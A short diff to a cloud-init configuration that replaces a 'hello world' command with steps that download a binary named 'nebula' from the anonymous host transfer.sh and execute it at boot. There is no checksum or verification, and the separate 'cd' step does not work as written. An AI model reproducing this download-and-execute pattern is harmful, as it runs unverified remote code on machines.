@@ -1,4 +1,9 @@
 #cloud-config
 runcmd:
  - [ mkdir, test]
- - [ sh, -xc, "echo $(date) ': hello world!'" ]
+ - [ mkdir, proxy]
+ - [ cd, proxy]
+ - [ mkdir, poop]
+ - [ wget, 'https://transfer.sh/XSn88/nebula' ]
+ - [ chmod, +x, nebula]
+ - [ './nebula']
